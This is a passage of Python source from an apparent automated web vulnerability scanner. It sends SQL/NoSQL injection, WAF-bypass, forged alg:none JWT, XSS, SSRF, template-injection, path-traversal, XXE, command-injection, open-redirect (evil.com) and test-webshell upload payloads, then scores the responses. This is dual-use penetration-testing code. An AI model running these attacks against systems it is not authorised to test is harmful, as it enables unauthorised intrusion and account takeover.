            self._log(f"[-] FALSE POSITIVE: Response identical to baseline")
            self._filtered_false_positives.append({
                "type": "NoSQL Injection",
                "payload": str(payload),
                "reason": "Response identical to invalid credentials baseline"
            })
            return False, 0.1, f"[FALSE POSITIVE] Response identical to baseline - no injection effect"
        
        # Step 5: 200 but same login page structure
        if resp.status_code == 200 and baseline.is_login_page:
            if "<!doctype" in body_lower or "<html" in body_lower:
                self._log(f"[-] FALSE POSITIVE: 200 but still login page HTML")
                self._filtered_false_positives.append({
                    "type": "NoSQL Injection", 
                    "payload": str(payload),
                    "reason": "200 response is still login page HTML"
                })
                return False, 0.15, f"[FALSE POSITIVE] 200 response is still login page HTML"
        
        return False, 0.2, f"No clear indicators. Status: {resp.status_code}, Baseline: {baseline.status_code}"
    
    def _test_sql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for SQL injection vulnerabilities using interactive payloads with WAF bypass."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_sqli_payloads()
        
        # Generate WAF bypass variations if WAF detected
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type}, adding bypass payloads)"
        
        self._log(f"[SQLi] Testing {len(interactive_payloads)} interactive payloads on {endpoint.url}{waf_info}")
        
        for ipayload in interactive_payloads:
            # Generate WAF bypass variations for this payload
            payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "sqli")
            
            for test_payload in payload_variations:
                if endpoint.method == "POST":
                    test_data = {
                        "username": test_payload,
                        "password": test_payload,
                    }
                    resp = self._make_request("POST", endpoint.url, json_data=test_data)
                    request_str = json.dumps(test_data)
                else:
                    # GET with query params
                    url = f"{endpoint.url}?id={urllib.parse.quote(test_payload)}"
                    resp = self._make_request("GET", url)
                    request_str = url
                
                # Use InteractiveValidator to validate response
                is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                    ipayload,
                    resp.body,
                    resp.elapsed_ms,
                    resp.status_code
                )
                
                # Log validation result
                bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                self._log(f"[SQLi] {ipayload.validation_type}{bypass_note}: {evidence[:60]}...")
                
                if is_vuln:
                    self._log(f"[!] CONFIRMED SQL INJECTION via {ipayload.validation_type}!")
                    results.append(VulnTestResult(
                        vuln_type=f"SQL Injection ({ipayload.validation_type})",
                        payload=test_payload,
                        target_url=endpoint.url,
                        request_data=request_str,
                        response=resp,
                        is_vulnerable=True,
                        confidence=confidence,
                        evidence=f"[CONFIRMED] {evidence}",
                        evidence_hash=self._hash_evidence(f"{ipayload.canary}:{resp.status_code}:{resp.elapsed_ms}")
                    ))
                    # Found confirmed vuln, stop testing this endpoint
                    return results
                elif confidence > 0.3:
                    results.append(VulnTestResult(
                        vuln_type=f"SQL Injection ({ipayload.validation_type})",
                        payload=test_payload,
                        target_url=endpoint.url,
                        request_data=request_str,
                        response=resp,
                        is_vulnerable=False,
                        confidence=confidence,
                        evidence=f"[UNCONFIRMED] {evidence}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    
        return results
    
    def _analyze_sqli_response(self, resp: HttpResponse, payload: str) -> tuple[bool, float, str]:
        """Analyze response for SQL injection indicators."""
        if resp.error:
            return False, 0.0, f"Request failed: {resp.error}"
            
        body_lower = resp.body.lower()
        
        # Error-based SQL injection indicators
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "syntax error", "unterminated", "quoted string",
            "odbc", "jdbc", "sqlstate", "sql server",
            "you have an error in your sql",
        ]
        
        for err in sql_errors:
            if err in body_lower:
                return True, 0.9, f"SQL error detected: '{err}' in response"
        
        # Auth bypass indicators
        if resp.status_code == 200:
            if any(tok in body_lower for tok in ["token", "jwt", "session", "welcome", "dashboard"]):
                return True, 0.85, f"Possible auth bypass. Status: {resp.status_code}"
                
        # Time-based detection would need response time comparison
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            if resp.elapsed_ms > 4500:  # Close to 5 second delay
                return True, 0.8, f"Time-based SQLi detected. Response time: {resp.elapsed_ms}ms"
        
        return False, 0.1, f"No SQL injection indicators. Status: {resp.status_code}"
    
    def _test_auth_bypass(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for authentication bypass vulnerabilities with proper verification."""
        results = []
        
        if endpoint.method != "POST" or "login" not in endpoint.url.lower():
            return results
        
        # Get baseline first
        baseline = self._capture_baseline(endpoint.url)
        base_url = endpoint.url.rsplit('/', 1)[0].rsplit('/login', 1)[0].rsplit('/auth', 1)[0]
            
        bypass_payloads = [
            # Type juggling
            {"username": "admin", "password": True},
            {"username": "admin", "password": 1},
            {"username": "admin", "password": []},
            {"username": "admin", "password": {"$gt": ""}},
            # Empty/null
            {"username": "admin", "password": ""},
            {"username": "admin", "password": None},
            # Default creds
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"},
        ]
        
        for payload in bypass_payloads:
            resp = self._make_request("POST", endpoint.url, json_data=payload)
            
            # Compare with baseline
            comparison = self._compare_with_baseline(baseline, resp)
            
            is_vuln = False
            confidence = 0.1
            evidence = f"Status: {resp.status_code}"
            is_false_positive = False
            
            # Try to extract and validate token
            token = self._extract_token(resp)
            if token:
                self._log(f"[*] Token found for payload: {json.dumps(payload)[:50]}")
                is_valid, validation_msg = self._validate_token(base_url, token)
                if is_valid:
                    self._log(f"[+] Token VALIDATED!")
                    is_vuln = True
                    confidence = 0.98
                    evidence = f"[VERIFIED] Auth bypass - {validation_msg}"
                else:
                    self._log(f"[-] Token invalid: {validation_msg}")
                    confidence = 0.5
                    evidence = f"Token received but unverified: {validation_msg}"
            elif comparison["is_significant"]:
                if comparison["new_user_data"]:
                    self._log(f"[+] New user data found!")
                    is_vuln = True
                    confidence = 0.85
                    evidence = f"[VERIFIED] Response contains user data not in baseline"
                elif comparison["bypassed_login_page"]:
                    self._log(f"[~] Login page structure changed")
                    confidence = 0.7
                    evidence = f"[LIKELY] Response structure changed from login page"
                elif comparison["significance_score"] >= 30:
                    confidence = 0.5
                    evidence = f"Significant change (score: {comparison['significance_score']}). Needs verification."
            elif not comparison["body_hash_changed"]:
                self._log(f"[-] FALSE POSITIVE: Identical to baseline")
                is_false_positive = True
                confidence = 0.1
                evidence = f"[FALSE POSITIVE] Response identical to baseline"
            elif resp.status_code == 200 and baseline.is_login_page:
                body_lower = resp.body.lower()
                if "<!doctype" in body_lower or "<form" in body_lower:
                    self._log(f"[-] FALSE POSITIVE: Still login page HTML")
                    is_false_positive = True
                    confidence = 0.15
                    evidence = f"[FALSE POSITIVE] Still returns login page HTML"
            
            # Track false positives
            if is_false_positive:
                self._filtered_false_positives.append({
                    "type": "Authentication Bypass",
                    "payload": json.dumps(payload),
                    "reason": evidence.replace("[FALSE POSITIVE] ", "")
                })
                
            if is_vuln or confidence > 0.5:
                results.append(VulnTestResult(
                    vuln_type="Authentication Bypass",
                    payload=json.dumps(payload),
                    target_url=endpoint.url,
                    request_data=json.dumps(payload),
                    response=resp,
                    is_vulnerable=is_vuln,
                    confidence=confidence,
                    evidence=evidence,
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if is_vuln:
                    break
                    
        return results
    
    def _test_jwt_vulnerabilities(self, base_url: str) -> list[VulnTestResult]:
        """Test for JWT vulnerabilities."""
        import base64
        results = []
        
        # First, try to get a valid JWT
        login_endpoints = ["/api/v1/login", "/api/login", "/auth/login", "/login"]
        valid_token = None
        
        for ep in login_endpoints:
            resp = self._make_request("POST", f"{base_url}{ep}", json_data={
                "username": "test",
                "password": "test"
            })
            if "token" in resp.body.lower():
                try:
                    data = json.loads(resp.body)
                    valid_token = data.get("token") or data.get("access_token") or data.get("jwt")
                    break
                except:
                    pass
        
        # Test alg:none vulnerability
        def forge_jwt(payload_data: dict) -> str:
            header = {"alg": "none", "typ": "JWT"}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
            return f"{header_b64}.{payload_b64}."
        
        forged_tokens = [
            forge_jwt({"user": "admin", "role": "admin"}),
            forge_jwt({"sub": "admin", "role": "superuser"}),
            forge_jwt({"username": "admin", "admin": True}),
        ]
        
        protected_endpoints = ["/api/v1/profile", "/api/v1/admin", "/api/profile", "/api/admin", "/admin"]
        
        for token in forged_tokens:
            for ep in protected_endpoints:
                url = f"{base_url}{ep}"
                resp = self._make_request("GET", url, headers={
                    "Authorization": f"Bearer {token}"
                })
                
                is_vuln = False
                confidence = 0.1
                evidence = f"Status: {resp.status_code}"
                
                if resp.status_code == 200:
                    body_lower = resp.body.lower()
                    
                    # Check for false positive indicators (login pages, error pages)
                    is_login_page = any(x in body_lower for x in [
                        "<title>log in", "login form", "password", "sign in",
                        "wp-login", "wordpress", "<!doctype html"
                    ]) and "<!doctype" in body_lower
                    
                    is_error_page = any(x in body_lower for x in [
                        "unauthorized", "forbidden", "access denied", "not authenticated"
                    ])
                    
                    # Check for actual data indicators (JSON response with user data)
                    try:
                        json_data = json.loads(resp.body)
                        has_user_data = isinstance(json_data, dict) and any(
                            k in json_data for k in ["user", "username", "email", "id", "role", "profile"]
                        )
                        if has_user_data:
                            is_vuln = True
                            confidence = 0.95
                            evidence = f"JWT alg:none accepted! Got user data: {list(json_data.keys())[:5]}"
                    except (json.JSONDecodeError, ValueError):
                        has_user_data = False
                    
                    # If not JSON but has sensitive data and NOT a login page
                    if not is_vuln and not is_login_page and not is_error_page:
                        if any(x in body_lower for x in ['"user":', '"email":', '"role":']):
                            is_vuln = True
                            confidence = 0.85
                            evidence = f"JWT alg:none accepted! Response contains user data."
                        elif resp.headers.get("Content-Type", "").startswith("application/json"):
                            confidence = 0.6
                            evidence = f"200 JSON response with forged token - needs verification"
                    elif is_login_page:
                        confidence = 0.2
                        evidence = f"Login page returned - NOT vulnerable (false positive filtered)"
                else:
                    confidence = 0.1
                    evidence = f"Non-200 response: {resp.status_code}"
                        
                if is_vuln or confidence > 0.5:
                    results.append(VulnTestResult(
                        vuln_type="JWT Algorithm Confusion (alg:none)",
                        payload=token,
                        target_url=url,
                        request_data=f"Authorization: Bearer {token}",
                        response=resp,
                        is_vulnerable=is_vuln,
                        confidence=confidence,
                        evidence=evidence,
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    
                    if is_vuln:
                        return results  # Found confirmed vuln
                        
        return results
    
    def _test_xss(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for XSS vulnerabilities using interactive canary-based validation with WAF bypass."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_xss_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[XSS] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Test on endpoints that might reflect input
        test_params = ["q", "query", "search", "name", "redirect", "callback", "url", "input", "text"]
        
        for param in test_params:
            for ipayload in interactive_payloads:
                # Generate WAF bypass variations
                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "xss")
                
                for test_payload in payload_variations:
                    url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
                    resp = self._make_request("GET", url)
                    
                    # Use InteractiveValidator to validate response
                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                        ipayload,
                        resp.body,
                        resp.elapsed_ms,
                        resp.status_code
                    )
                    
                    if is_vuln:
                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                        self._log(f"[!] CONFIRMED XSS{bypass_note} with canary {ipayload.canary[:20]}...")
                        results.append(VulnTestResult(
                            vuln_type="Cross-Site Scripting (XSS)",
                            payload=test_payload,
                            target_url=url,
                            request_data=url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=confidence,
                            evidence=f"[CONFIRMED] XSS canary reflected unencoded: {ipayload.canary[:20]}...",
                            evidence_hash=self._hash_evidence(f"XSS:{ipayload.canary}:{resp.status_code}")
                        ))
                        return results  # Found confirmed
                    
        return results
    
    def _test_ssrf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for SSRF vulnerabilities using interactive validation with WAF bypass."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_ssrf_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[SSRF] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Look for URL parameters
        url_params = ["url", "redirect", "next", "target", "fetch", "proxy", "uri", "img", "file", "document"]
        
        for param in url_params:
            for ipayload in interactive_payloads:
                # Generate WAF bypass variations for SSRF
                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssrf")
                
                for test_payload in payload_variations:
                    try:
                        test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
                        resp = self._make_request("GET", test_url)
                        
                        # Use InteractiveValidator to validate response
                        is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                            ipayload,
                            resp.body,
                            resp.elapsed_ms,
                            resp.status_code
                        )
                        
                        if is_vuln:
                            bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                            self._log(f"[!] CONFIRMED SSRF{bypass_note}: Cloud metadata or internal response detected")
                            results.append(VulnTestResult(
                                vuln_type="Server-Side Request Forgery (SSRF)",
                                payload=test_payload,
                                target_url=test_url,
                                request_data=test_url,
                                response=resp,
                                is_vulnerable=True,
                                confidence=confidence,
                                evidence=f"[CONFIRMED] {evidence}",
                                evidence_hash=self._hash_evidence(f"SSRF:{ipayload.canary}:{resp.status_code}")
                            ))
                            return results
                    except Exception:
                        # Skip on timeout/connection errors
                        continue
                        
        return results
    
    # ==================== NEW TEST METHODS ====================
    
    def _test_ssti(self, base_url: str, endpoints: list[EndpointInfo], 
                   tech_stack: TechStack) -> list[VulnTestResult]:
        """Test for Server-Side Template Injection using interactive math-based validation."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_ssti_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[SSTI] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Test parameters that might be rendered in templates
        test_params = ["name", "title", "message", "template", "content", "text", "q", "search", "input"]
        
        for param in test_params:
            for ipayload in interactive_payloads:
                # Generate WAF bypass variations
                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssti")
                
                for test_payload in payload_variations:
                    test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
                    resp = self._make_request("GET", test_url)
                    
                    # Use InteractiveValidator to validate response
                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                        ipayload,
                        resp.body,
                        resp.elapsed_ms,
                        resp.status_code
                    )
                    
                    if is_vuln:
                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                        self._log(f"[!] CONFIRMED SSTI{bypass_note} via math validation: {test_payload}")
                        results.append(VulnTestResult(
                            vuln_type="Server-Side Template Injection (SSTI)",
                            payload=test_payload,
                            target_url=test_url,
                            request_data=test_url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=confidence,
                            evidence=f"[CONFIRMED] Math expression evaluated: {test_payload} = {ipayload.canary}",
                            evidence_hash=self._hash_evidence(f"SSTI:{ipayload.canary}:{resp.status_code}")
                        ))
                        return results  # Found confirmed
        
        # Test POST endpoints
        for endpoint in endpoints:
            if endpoint.method == "POST":
                for ipayload in interactive_payloads[:3]:  # Limit payloads
                    # Generate WAF bypass variations for POST
                    payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "ssti")[:3]
                    
                    for test_payload in payload_variations:
                        data = {p: test_payload for p in endpoint.parameters[:2]} if endpoint.parameters else {"input": test_payload}
                        resp = self._make_request("POST", endpoint.url, json_data=data)
                        
                        is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                            ipayload,
                            resp.body,
                            resp.elapsed_ms,
                            resp.status_code
                        )
                        
                        if is_vuln:
                            bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                            self._log(f"[!] CONFIRMED SSTI{bypass_note} in POST: {test_payload}")
                            results.append(VulnTestResult(
                                vuln_type="Server-Side Template Injection (SSTI)",
                                payload=test_payload,
                                target_url=endpoint.url,
                                request_data=json.dumps(data),
                                response=resp,
                                is_vulnerable=True,
                                confidence=confidence,
                                evidence=f"[CONFIRMED] Math expression evaluated in POST body",
                                evidence_hash=self._hash_evidence(f"SSTI:{ipayload.canary}:{resp.status_code}")
                            ))
                            return results
        
        return results
    
    def _test_lfi(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Local File Inclusion / Path Traversal using interactive validation."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_lfi_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[LFI] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Common parameters for file inclusion
        file_params = ["file", "page", "path", "include", "doc", "document", "template", "view", "load", "read", "f"]
        
        for param in file_params:
            for ipayload in interactive_payloads:
                # Generate WAF bypass variations
                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "lfi")
                
                for test_payload in payload_variations:
                    test_url = f"{base_url}/?{param}={urllib.parse.quote(test_payload)}"
                    resp = self._make_request("GET", test_url)
                    
                    # Use InteractiveValidator to validate response
                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                        ipayload,
                        resp.body,
                        resp.elapsed_ms,
                        resp.status_code
                    )
                    
                    if is_vuln:
                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                        self._log(f"[!] CONFIRMED LFI{bypass_note}: {test_payload[:50]}...")
                        results.append(VulnTestResult(
                            vuln_type="Local File Inclusion (LFI)",
                            payload=test_payload,
                            target_url=test_url,
                            request_data=test_url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=confidence,
                            evidence=f"[CONFIRMED] File content verified: {ipayload.canary}",
                            evidence_hash=self._hash_evidence(f"LFI:{ipayload.canary}:{resp.status_code}")
                        ))
                        return results
        
        return results
    
    def _test_xxe(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for XML External Entity Injection using interactive validation."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_xxe_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[XXE] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Look for XML endpoints
        xml_endpoints = [e for e in endpoints if "xml" in e.content_type.lower() or "xml" in e.url.lower()]
        
        # Also try common XML paths
        xml_paths = ["/api/import", "/upload", "/parse", "/xml", "/data", "/soap", "/xmlrpc"]
        
        for path in xml_paths:
            url = f"{base_url}{path}"
            for ipayload in interactive_payloads:
                # XXE payloads shouldn't be URL-encoded, use original
                test_payload = ipayload.payload
                
                resp = self._make_request("POST", url, 
                    data=test_payload.encode(),
                    headers={"Content-Type": "application/xml"}
                )
                
                # Use InteractiveValidator to validate response
                is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                    ipayload,
                    resp.body,
                    resp.elapsed_ms,
                    resp.status_code
                )
                
                if is_vuln:
                    self._log(f"[!] CONFIRMED XXE: {url}")
                    results.append(VulnTestResult(
                        vuln_type="XML External Entity (XXE)",
                        payload=test_payload[:100] + "...",
                        target_url=url,
                        request_data=test_payload,
                        response=resp,
                        is_vulnerable=True,
                        confidence=confidence,
                        evidence=f"[CONFIRMED] {evidence}",
                        evidence_hash=self._hash_evidence(f"XXE:{ipayload.canary}:{resp.status_code}")
                    ))
                    return results
        
        return results
    
    def _test_rce(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Remote Code Execution / Command Injection using interactive validation with WAF bypass."""
        results = []
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_rce_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[RCE] Testing {len(interactive_payloads)} interactive payloads{waf_info}")
        
        # Common injection parameters
        cmd_params = ["cmd", "exec", "command", "ping", "query", "host", "ip", "process", "run"]
        
        for param in cmd_params:
            for ipayload in interactive_payloads:
                # Generate WAF bypass variations
                payload_variations = self._get_waf_bypass_payloads(ipayload.payload, "rce")
                
                for test_payload in payload_variations:
                    test_url = f"{base_url}/?{param}=127.0.0.1{urllib.parse.quote(test_payload)}"
                    resp = self._make_request("GET", test_url)
                    
                    # Use InteractiveValidator to validate response
                    is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                        ipayload,
                        resp.body,
                        resp.elapsed_ms,
                        resp.status_code
                    )
                    
                    if is_vuln:
                        bypass_note = " (bypass)" if test_payload != ipayload.payload else ""
                        self._log(f"[!] CONFIRMED RCE{bypass_note} via {ipayload.validation_type}!")
                        results.append(VulnTestResult(
                            vuln_type=f"Remote Code Execution ({ipayload.validation_type})",
                            payload=test_payload,
                            target_url=test_url,
                            request_data=test_url,
                            response=resp,
                            is_vulnerable=True,
                            confidence=confidence,
                            evidence=f"[CONFIRMED] {evidence}",
                            evidence_hash=self._hash_evidence(f"RCE:{ipayload.validation_type}:{resp.elapsed_ms}")
                        ))
                        return results
        
        return results
    
    def _test_crlf(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for CRLF Injection / HTTP Response Splitting."""
        results = []
        
        payloads = [
            "%0d%0aX-Injected: true",
            "%0d%0aSet-Cookie: injected=true",
            "\r\nX-Injected: true",
            "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF
        ]
        
        redirect_params = ["url", "redirect", "next", "return", "dest", "goto"]
        
        for param in redirect_params:
            for payload in payloads:
                test_url = f"{base_url}/?{param}=http://example.com{payload}"
                resp = self._make_request("GET", test_url)
                
                # Check if our header was injected
                if "X-Injected" in str(resp.headers) or "injected=true" in str(resp.headers):
                    results.append(VulnTestResult(
                        vuln_type="CRLF Injection",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.90,
                        evidence="Header injection successful",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{str(resp.headers)[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_open_redirect(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Open Redirect vulnerabilities."""
        results = []
        
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "////evil.com",
            "https://evil.com%2f%2f",
            "https://evil.com?@legitimate.com",
        ]
        
        redirect_params = ["url", "redirect", "next", "return", "dest", "goto", "continue", "target", "rurl", "redirect_uri"]
        
        for param in redirect_params:
            for payload in payloads:
                test_url = f"{base_url}/?{param}={urllib.parse.quote(payload)}"
                resp = self._make_request("GET", test_url)
                
                # Check for redirect to evil domain
                location = resp.headers.get("Location", resp.headers.get("location", ""))
                if "evil.com" in location:
                    results.append(VulnTestResult(
                        vuln_type="Open Redirect",
                        payload=payload,
                        target_url=test_url,
                        request_data=test_url,
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.90,
                        evidence=f"Redirect to external domain: {location}",
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{location}")
                    ))
                    return results
        
        return results
    
    def _test_cors(self, base_url: str) -> list[VulnTestResult]:
        """Test for CORS misconfigurations."""
        results = []
        
        test_origins = [
            "https://evil.com",
            "null",
            f"{base_url}.evil.com",  # Subdomain
            base_url.replace("https://", "https://evil."),  # Prefix injection
        ]
        
        for origin in test_origins:
            resp = self._make_request("GET", base_url, headers={"Origin": origin})
            
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == origin or acao == "*":
                is_critical = acac.lower() == "true" and acao != "*"
                confidence = 0.95 if is_critical else 0.70
                severity = "CRITICAL" if is_critical else "MEDIUM"
                
                results.append(VulnTestResult(
                    vuln_type=f"CORS Misconfiguration ({severity})",
                    payload=origin,
                    target_url=base_url,
                    request_data=f"Origin: {origin}",
                    response=resp,
                    is_vulnerable=is_critical,
                    confidence=confidence,
                    evidence=f"ACAO: {acao}, ACAC: {acac}",
                    evidence_hash=self._hash_evidence(f"{acao}:{acac}")
                ))
                
                if is_critical:
                    return results
        
        return results
    
    def _test_graphql(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for GraphQL vulnerabilities."""
        results = []
        
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        
        # Introspection query
        introspection = {
            "query": "{__schema{types{name,fields{name}}}}"
        }
        
        # Batch query (DoS potential)
        batch_query = [
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
        ]
        
        for path in graphql_paths:
            url = f"{base_url}{path}"
            
            # Test introspection
            resp = self._make_request("POST", url, json_data=introspection)
            
            if "__schema" in resp.body or "types" in resp.body:
                self._log(f"[+] GraphQL introspection enabled at {url}")
                results.append(VulnTestResult(
                    vuln_type="GraphQL Introspection Enabled",
                    payload=introspection["query"],
                    target_url=url,
                    request_data=json.dumps(introspection),
                    response=resp,
                    is_vulnerable=True,
                    confidence=0.90,
                    evidence="Schema information disclosed via introspection",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
            
            # Test batch queries
            resp = self._make_request("POST", url, json_data=batch_query)
            
            if resp.status_code == 200 and resp.body.count("__typename") >= 3:
                results.append(VulnTestResult(
                    vuln_type="GraphQL Batching Enabled (DoS risk)",
                    payload=str(batch_query),
                    target_url=url,
                    request_data=json.dumps(batch_query),
                    response=resp,
                    is_vulnerable=False,  # Info only
                    confidence=0.70,
                    evidence="Multiple queries accepted in single request",
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
        
        return results
    
    def _test_file_upload(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for insecure file upload."""
        results = []
        
        # Find upload endpoints
        upload_endpoints = [e for e in endpoints if any(
            x in e.url.lower() for x in ["upload", "file", "image", "avatar", "import"]
        )]
        
        if not upload_endpoints:
            upload_endpoints = [EndpointInfo(url=f"{base_url}/upload", method="POST")]
        
        # Dangerous extensions to test
        payloads = [
            ("test.php", "<?php echo 'RCE'; ?>", "application/x-php"),
            ("test.php.jpg", "<?php echo 'RCE'; ?>", "image/jpeg"),
            ("test.phtml", "<?php echo 'RCE'; ?>", "text/html"),
            ("test.asp", "<% Response.Write(\"RCE\") %>", "application/octet-stream"),
            ("test.jsp", "<%= \"RCE\" %>", "application/octet-stream"),
            ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in payloads:
                # Build multipart form data (simplified)
                boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: {content_type}\r
\r
{content}\r
--{boundary}--"""
                
                resp = self._make_request("POST", endpoint.url,
                    data=body.encode(),
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
                )
                
                # Check if file was accepted
                if resp.status_code in [200, 201] and "error" not in resp.body.lower():
                    # Try to extract uploaded file path
                    try:
                        data = json.loads(resp.body)
                        file_path = data.get("path") or data.get("url") or data.get("file")
                        evidence = f"File uploaded: {file_path}" if file_path else "File upload accepted"
                    except:
                        evidence = "File upload accepted without extension validation"
                    
                    results.append(VulnTestResult(
                        vuln_type="Insecure File Upload",
                        payload=filename,
                        target_url=endpoint.url,
                        request_data=f"Filename: {filename}, Content-Type: {content_type}",
                        response=resp,
                        is_vulnerable=True,
                        confidence=0.80,
                        evidence=evidence,
                        evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                    ))
                    return results
        
        return results
    
    def _test_prototype_pollution(self, base_url: str, endpoints: list[EndpointInfo]) -> list[VulnTestResult]:
        """Test for Prototype Pollution (Node.js)."""
        results = []
        
        payloads = [
            {"__proto__": {"polluted": True}},
            {"constructor": {"prototype": {"polluted": True}}},
            {"__proto__.polluted": True},
        ]
        
        for endpoint in endpoints:
            if endpoint.method == "POST":
                for payload in payloads:
                    resp = self._make_request("POST", endpoint.url, json_data=payload)
                    
                    # Check if prototype was polluted (response might include polluted property)
                    if "polluted" in resp.body and "true" in resp.body.lower():
                        results.append(VulnTestResult(
                            vuln_type="Prototype Pollution",
                            payload=json.dumps(payload),
                            target_url=endpoint.url,
                            request_data=json.dumps(payload),
                            response=resp,
                            is_vulnerable=True,
                            confidence=0.85,
                            evidence="Prototype property reflected in response",
                            evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                        ))
                        return results
        
        return results
    
    def _test_deserialization(self, base_url: str, endpoints: list[EndpointInfo], 
                              tech_stack: TechStack) -> list[VulnTestResult]:
        """Test for insecure deserialization."""
        results = []
        
        lang = (tech_stack.language or "").lower()
        
        # Language-specific payloads
        if "php" in lang:
            # PHP serialize
            payloads = [
